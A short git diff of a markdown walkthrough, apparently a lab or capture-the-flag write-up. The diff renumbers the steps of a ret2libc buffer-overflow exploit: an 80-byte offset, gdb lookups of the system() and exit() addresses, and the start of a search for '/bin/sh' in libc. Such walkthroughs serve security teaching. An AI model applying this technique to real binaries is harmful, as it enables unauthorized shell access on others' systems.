@@ -25,19 +25,19 @@ To successfully exploit the vulnerability, we’ll use a **ret2libc**, you need 
 
 Our offset is therefore 80 Bytes according to the **0x37634136** value (I did this manipulation with an Buffer overflow pattern generator).
 
-3. Retrieve the **`system()`** address :
+2. Retrieve the **`system()`** address :
 ```c
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 ```
 
-4. Retrieve **`exit()`** address :
+3. Retrieve **`exit()`** address :
 ```c
 (gdb) p exit
 $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 ```
 
-5. Find **`"/bin/sh"`** string address in libc-2.15.so using **`find`** command :
+4. Find **`"/bin/sh"`** string address in libc-2.15.so using **`find`** command :
 ```
 (gdb) info proc map
 process 1865
